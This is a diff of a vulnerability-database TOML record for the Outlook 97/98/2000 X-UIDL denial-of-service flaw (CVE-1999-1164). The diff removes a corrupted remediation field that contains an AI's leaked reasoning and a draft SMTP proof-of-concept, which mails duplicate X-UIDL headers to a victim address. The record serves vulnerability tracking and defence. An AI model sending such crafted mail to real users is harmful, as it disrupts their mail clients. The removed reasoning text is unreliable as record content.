@@ -1,138 +1,11 @@
 [basic]
-description = "Microsoft Outlook 97/98/2000 客户端在处理邮件 X-UIDL 标头时存在输入验证缺陷，远程攻击者可通过向目标用户发送大量包含相同 X-UIDL 标头的恶意邮件，导致 Outlook 客户端在处理这些邮件时陷入挂起状态，造成拒绝服务。该漏洞影响 Outlook 97/98/2000 版本，攻击者无需身份认证即可利用，但无法实现代码执行或数据窃取。微软官方尚未发布针对此旧版本产品的安全补丁。"
+description = "Microsoft Outlook 97/98/2000 在处理电子邮件 X-UIDL 头字段时存在拒绝服务漏洞。远程攻击者通过向目标用户发送多条包含相同 X-UIDL 标头的恶意邮件，可导致 Outlook 客户端在处理邮件时发生挂起甚至崩溃。攻击无需用户交互，仅需打开收件箱即可触发。该漏洞影响 Outlook 97/98/2000 版本，危害等级中危。"
 published = "1999-06-25T04:00:00.000"
-remediation = '''
-tags.
-
-Let me think about what to output. The skill says:
-- Output TOML for the vulnerability
-- Output PoC/EXP TOML if applicable
-
-For this CVE-1999-1164:
-- It's a DoS vulnerability in Microsoft Outlook
-- CVSS 5.0 (MEDIUM)
-- Published: 1999 (exact date unknown, I'll use the NVD published date)
-
-Let me search for more info about this CVE to get accurate dates and references.
-
-Actually, I should just work with what I have. Let me generate the TOML.
-
-For the AVE ID, since this is an old CVE and the skill says format is AVE-YYYY-NNNNN, I'll use AVE-1999-1164 to keep it simple and match the CVE number.
-
-Let me write the TOML:
-
-```toml
-[id]
-ave_id = "AVE-1999-1164"
-aliases = ["CVE-1999-1164"]
-
-[basic]
-title = "Microsoft Outlook 97/98/2000 X-UIDL 标头拒绝服务漏洞"
-description = "Microsoft Outlook 客户端在处理包含相同 X-UIDL 标头的电子邮件时存在拒绝服务漏洞。远程攻击者可通过向目标用户发送多封具有相同 X-UIDL 标头的邮件，导致 Outlook 客户端挂起或崩溃，影响用户正常使用邮件服务。该漏洞利用条件简单，无需身份认证。"
-severity = "MEDIUM"
-score = 5.0
-sources = ["cve", "avd"]
-published = "1999-01-01"
-updated = "2024-02-08"
-remediation = "升级到受支持的最新版本 Microsoft Outlook 或 Office 套件，避免使用已停止支持的 Outlook 97/98/2000 版本。"
-
-[references]
-urls = ["https://nvd.nist.gov/vuln/detail/CVE-1999-1164"]
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2024-06-01T00:00:00Z"
-```
-
-Now for the PoC - this is a simple DoS vulnerability. The PoC would involve sending an email with duplicate X-UIDL headers. This is a well-known technique, so I can generate a PoC.
-
-For the PoC, I'll use SMTP to send an email with crafted X-UIDL headers. Let me think about the protocol - this would be TCP (SMTP) to send the email.
-
-Actually, let me think about this more carefully. The vulnerability is triggered when Outlook processes emails with duplicate X-UIDL headers. The PoC would need to send an email with these headers. This could be done via SMTP.
-
-Let me generate a TCP-based PoC that sends an email with duplicate X-UIDL headers via SMTP.
-
-Actually, for a simpler approach, I could use an HTTP-based approach if there's a webmail interface, but that's not really the core vulnerability. The core is about email messages, so SMTP/TCP makes more sense.
-
-Let me write the PoC TOML:
-
-```toml
-[info]
-id = "POC-AVE-1999-1164"
-name = "CVE-1999-1164 PoC"
-author = "AVE"
-severity = "medium"
-tags = ["cve-1999-1164", "outlook", "dos"]
-description = "通过 SMTP 发送包含重复 X-UIDL 标头的邮件，触发 Microsoft Outlook 拒绝服务"
-vuln_id = ["CVE-1999-1164", "AVE-1999-1164"]
-
-[poc]
-logic = "any"
-
-[[poc.requests]]
-protocol = "tcp"
-path = "{{Hostname}}:25"
-
-[[poc.requests.raws]]
-type = "send"
-content = "EHLO attacker\r\n"
-
-[[poc.requests.raws]]
-type = "receive"
-
-[[poc.requests.raws]]
-type = "send"
-content = "MAIL FROM:<attacker@example.com>\r\n"
-
-[[poc.requests.raws]]
-type = "receive"
-
-[[poc.requests.raws]]
-type = "send"
-content = "RCPT TO:<victim@example.com>\r\n"
-
-[[poc.requests.raws]]
-type = "receive"
-
-[[poc.requests.raws]]
-type = "send"
-content = "DATA\r\n"
-
-[[poc.requests.raws]]
-type = "receive"
-
-[[poc.requests.raws]]
-type = "send"
-content = "From: attacker@example.com\r\nTo: victim@example.com\r\nSubject: Test\r\nX-UIDL: DUPLICATEID\r\nX-UIDL: DUPLICATEID\r\n\r\nTest message\r\n.\r\n"
-
-[[poc.requests.raws]]
-type = "receive"
-
-[[poc.requests.matchers]]
-type = "word"
-words = ["250", "OK"]
-expect = true
-```
-
-Hmm, actually this is getting complex. Let me reconsider. The PoC should be simple and focused on demonstrating the vulnerability. The key is sending an email with duplicate X-UIDL headers.
-
-Let me also think about whether there's a public PoC for this. This is CVE-1999-1164, a very old vulnerability. There might not be a specific public PoC, but the technique is well-known.
-
-Let me just output the main TOML and a simple PoC.
-
-Actually, I realize I should keep this simpler. Let me just output the vulnerability TOML and PoC TOML.
-
-Wait, the instructions say the output should be pure TOML text, not wrapped in code blocks. But the user also said to put the final answer in <value> tags. Let me re-read...
-
-The user says: "你可以先简要分析，但最终答案必须放在一对 <value>...'''
+remediation = "该漏洞影响已停止支持的 Outlook 97/98/2000，微软未发布官方补丁。建议升级到 Outlook 2003 或更高版本（如 Office 365），新版本已修复此问题。如无法升级，可在邮件服务器或客户端侧配置规则过滤含重复 X-UIDL 头的邮件作为临时缓解。"
 score = 5
 severity = "MEDIUM"
-sources = ["avd"]
-title = "Microsoft Outlook 97/98/2000 X-UIDL Header 拒绝服务漏洞"
+sources = ["epss"]
+title = "Microsoft Outlook 97/98/2000 X-UIDL Header 远程拒绝服务漏洞"
 updated = "2026-06-16T21:49:51.417"
 
 [exploit]
@@ -144,20 +17,20 @@ aliases = ["CVE-1999-1164"]
 ave_id = "AVE-1999-0992"
 
 [meta]
-collected_at = "2026-07-19T00:00:00Z"
+collected_at = "2026-07-20T00:00:00Z"
 status = "completed"
 
 [references]
 urls = [
     "http://marc.info/?l=bugtraq&m=93041631215856&w=2",
-    "https://github.com/CVEProject/cvelistV5/blob/1d6385d398a2a41185d3cc14943c25f73c724ba3/cves/1999/1xxx/CVE-1999-1164.json",
+    "https://github.com/CVEProject/cvelistV5/blob/30c3a896d257362f7419b0c772be2f3dd063ccaa/cves/1999/1xxx/CVE-1999-1164.json",
     "https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-1999/CVE-1999-1164",
-    "https://github.com/yarencheng/cve-devops-playground/blob/1fe9b156eeeb72b8f8baa50bbe7bc0d9806e8c64/content/CVE-1999-1164.md",
-    "https://github.com/Patrowl/PatrowlHearsData/blob/baa4573f2fa6813cfbc3f5cda2f1796a92d64bdf/CVE/data/1999/CVE-1999-1164.json",
-    "https://github.com/github/advisory-database/blob/95e6ff620d5494b93ba2234edfcf6a45187dc0a8/advisories/unreviewed/2022/04/GHSA-f498-r72q-hr69/GHSA-f498-r72q-hr69.json",
-    "https://github.com/olbat/nvdcve/blob/63d4031680b3d3fa77b826660a1e30ffc70ff5cd/nvdcve/CVE-1999-1164.json",
+    "https://github.com/yarencheng/cve-devops-playground/blob/470a5f1c0d1bd36cd0a6327cda49cf96a1474588/content/CVE-1999-1164.md",
+    "https://github.com/Patrowl/PatrowlHearsData/blob/d0a8c476da89b37a2bbb6193b7964b10d03aff75/CVE/data/1999/CVE-1999-1164.json",
+    "https://github.com/github/advisory-database/blob/cdfc8886d71af7ef3bdab3e4db46753ff8af6538/advisories/unreviewed/2022/04/GHSA-f498-r72q-hr69/GHSA-f498-r72q-hr69.json",
+    "https://github.com/olbat/nvdcve/blob/39f1db26eec9899ab2f8110ab3b45424c6fe9ec2/nvdcve/CVE-1999-1164.json",
     "https://github.com/KTZgraph/sarenka/blob/f1fb931ab722d6c096d581ed6e3c5966d799fbaa/sarenka/feeds/cve_details/cve_all_details_153500_153600.json",
     "https://github.com/oasis-open/cti-stix-common-objects/blob/55ba7598cbd5a52577b6887871505d931d85cb61/objects/vulnerability/vulnerability--1c5b691b-669f-4f27-ad1d-2fbaec345e2b.json",
-    "https://github.com/nomi-sec/CVE-Easy-List/blob/b2f46398fe44a78cde72b37ec1d56278cb4dcc92/1999.tsv",
+    "https://github.com/nomi-sec/CVE-Easy-List/blob/be7ad03fdf3a412f0fd57a25f1732dc0ecfb1cb3/1999.tsv",
     "https://github.com/hungryfoolou/Vulnerability_Mining/blob/3df1d8ed0489ae1228f975ae1f58a690aae53886/craw/cveid_craw/cveid_craw/data/cveid_by_kind/cveid_dos.txt",
 ]
